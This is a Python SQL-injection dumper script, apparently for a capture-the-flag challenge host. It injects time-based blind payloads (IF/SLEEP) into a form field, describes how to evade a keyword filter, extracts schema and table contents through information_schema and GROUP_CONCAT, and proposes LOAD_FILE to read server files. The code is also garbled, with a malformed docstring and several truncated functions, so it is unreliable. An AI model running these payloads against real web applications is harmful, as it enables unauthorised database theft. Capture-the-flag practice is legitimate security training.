#!/usr/bin/env python3
"""
sqli6.chal.deti:8035 — reflection-based dumper.

Fixes over the previous attempt:
  - never emits EXISTS / WHERE / UNION / COUNT / MIN (all confirmed blocked)
  - uses LIMIT n,1 + CHAR_LENGTH(...)>0 for existence checks
  - uses the reflection channel (INSERT + GET) for extraction, not blind SLEEP
    binary search, so a full table name costs ~1 round-trip instead of ~240
  - fast path: GROUP_CONCAT via reflection (one request for all tables)
  - medium path: brute-force common table names via reflection
  - slow path: blind LIMIT iteration (only if both above fail)
"""
import requests, time, re, uuid, statistics, sys

BASE   = "http://sqli6.chal.deti:8035"
SLEEP  = 0.30
THRESH = 0.15
S = requests.Session()
S.headers.update({"User-Agent": "sqli-dump/3.1"})
BASE_MS = 0.0
FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,20}\{[^}\r\n]{3,150}\}")

# ---------- transport / oracle (same as before, it works) ----------
def _post(msg):
    t0 = time.perf_counter()
    try:
        S.post(BASE, data={"name": f"u{uuid.uuid4().hex[:8]}", "message": msg}, timeout=25)
        return time.perf_counter() - t0
    except Exception:
        return 25.0

def calibrate():
    global BASE_MS
    base  = statistics.median([_post("hi") for _ in range(7)])
    slept = statistics.median([_post(f"x'||SLEEP({SLEEP})||'y") for _ in range(3)])
    BASE_MS = base
    print(f"[*] baseline={base*1000:.0f}ms sleep={slept*1000:.0f}ms margin={(slept-base)*1000:.0f}ms")
    assert slept - base > THRESH, "oracle unstable"

def oracle(cond):
    return _post(f"x'||IF(({cond}),SLEEP({SLEEP}),0)||'y") > BASE_MS + THRESH

def get_int(expr, lo=0, hi=2**31):
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr})>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_str(expr, max_len=200):
    L = get_int(f"CHAR_LENGTH(({expr}))", 0, max_len)
    out = []
    for i in range(1, L + 1):
        c = get_int(f"ASCII(SUBSTR(({expr}),{i},1))", 0, 256)
        out.append(chr(c) if 0 < c < 128 else "?")
        print(f"\r  {''.join(out)!r}", end="", flush=True)

def reflect_hex(expr):

    None  → INSERT failed (SQL error, usually = missing table/column)
    ''    → expression was NULL
    str   → result"""

    if not m:
        return None
    try:
        return bytes.fromhex(m.group(1)).decode("utf-8", errors="replace")
    except Exception:
        return ""

def find_flag(s):
    m = FLAG_RE.search(s or "")
    return m.group(0) if m else None

def discover_tables_gc():
    """Fast path: GROUP_CONCAT via reflection. One request for everything."""

def columns_gc(table):

            f"FROM information_schema.columns)")
    raw = reflect_hex(expr)

def dump(schema, table, cols):

        f = find_flag(r)
        if f:

    return None

    print("[*] try LOAD_FILE paths against the paths in diagnostic section H")
